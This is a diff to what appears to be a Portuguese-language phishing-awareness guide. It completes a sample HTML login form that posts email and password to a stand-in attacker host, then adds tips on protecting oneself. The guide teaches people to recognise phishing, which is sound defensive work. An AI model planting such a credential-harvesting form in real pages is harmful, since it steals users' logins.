@@ -49,4 +49,15 @@ Muitas vezes, o ataque começa com um script simples escondido em um botão de "
 <form action="https://servidor-do-atacante.com/coletar" method="POST">
   <input type="email" name="user_email" placeholder="Seu e-mail">
   <input type="password" name="user_pass" placeholder="Sua senha">
-  <button type="submit">
+  <button type="submit">Entrar</button>
+</form>
+```
+
+A página parece idêntica à do serviço legítimo, mas o formulário envia os dados diretamente para o atacante.
+
+## Como Se Proteger
+
+- Verifique sempre a URL na barra de endereços antes de digitar credenciais.
+- Use autenticação em dois fatores (2FA/MFA).
+- Desconfie de mensagens que criam urgência artificial.
+- Em caso de dúvida, acesse o site digitando o endereço manualmente ou por favoritos.
